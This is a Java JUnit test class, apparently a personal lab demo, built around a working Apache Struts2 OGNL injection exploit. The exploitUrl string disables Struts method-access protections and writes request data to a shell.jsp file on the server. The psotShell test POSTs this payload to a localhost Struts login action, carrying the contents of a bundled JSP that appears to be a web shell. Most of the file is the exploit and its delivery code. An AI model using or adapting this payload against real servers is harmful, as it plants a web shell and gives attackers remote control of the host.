package cn.sluk3r.test.collection.httpClient;

import org.apache.http.client.fluent.Form;
import org.apache.http.client.fluent.Request;
import org.junit.Test;

import java.io.*;
import java.net.URLEncoder;
import java.util.Date;

import static junit.framework.TestCase.assertNotNull;

/**
 * Created by baiing on 2014/7/19.
 */
public class HttpPostDemo {

//    String exploitUrl = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43fos\\75new%20java.io.FileOutputStream(\\43req.getParameter(%22path%22))')(d))&(i3)(('\\43fos.write(\\43req.getParameter(%22data%22).getBytes())')(d))&(i4)(('\\43fos.close()')(d))";
    String exploitUrl = "('\\u0023_memberAccess[\\'allowStaticMethodAccess\\']')(meh)=true&(aaa)(('\\u0023context[\\'xwork.MethodAccessor.denyMethodExecution\\']\\u003d\\u0023foo')(\\u0023foo\\u003dnew%20java.lang.Boolean(%22false%22)))&(i1)(('\\43req\\75@org.apache.struts2.ServletActionContext@getRequest()')(d))&(i2)(('\\43fos\\75new%20java.io.FileOutputStream(\\43req.getParameter(%/%22)+%22/shell.jsp%22)')(d))&(i3)(('\\43fos.write(\\43req.getParameter(%22data%22).getBytes())')(d))&(i4)(('\\43fos.close()')(d))";
    String shellJspPath = "Browser.jsp";


    @Test
    public void dm() {

        try {
            File f = new File("./created.jsp");

            if (! f.exists()) {
                f.createNewFile();
            }

            Date current  = new Date();
            FileWriter fw = new FileWriter(f);

            BufferedWriter br = new BufferedWriter(fw);

            String s =  current.toString();
            br.write(s, 0, s.length());

            br.close();

            System.out.println(f.getAbsolutePath());
        } catch (Exception e) {
            e.printStackTrace();
        }

    }


    @Test
    public void testReadFile() throws IOException {
        System.out.println(readFile());
    }


    public String readFile() throws IOException {
        InputStream is = HttpPostDemo.class.getClassLoader().getResourceAsStream( "cn/sluk3r/test/collection/httpClient/"+ shellJspPath);
        assertNotNull(is);

        InputStreamReader r = new InputStreamReader(is);
        BufferedReader br = new BufferedReader(r);

        StringBuilder result = new StringBuilder();

        String line;
        while((line = br.readLine()) != null) {
            result.append(line);
        }

        return result.toString();
    }


    @Test
    public void demo() throws IOException {
        System.out.println(Request.Post("http://localhost:8080/shellDemo/User/Login.action")
                .bodyForm(Form.form().add("username", "sluk3r").add("password", "sluk3r").build())
                .execute().returnContent());
    }

    @Test
    public void psotShell() throws IOException {
        Request.Post(String.format("http://localhost:8080/shellDemo/User/Login.action?%s", exploitUrl))
                .bodyForm(Form.form().add("data",  URLEncoder.encode(readFile())).build())
                .execute().returnContent();

    }
}
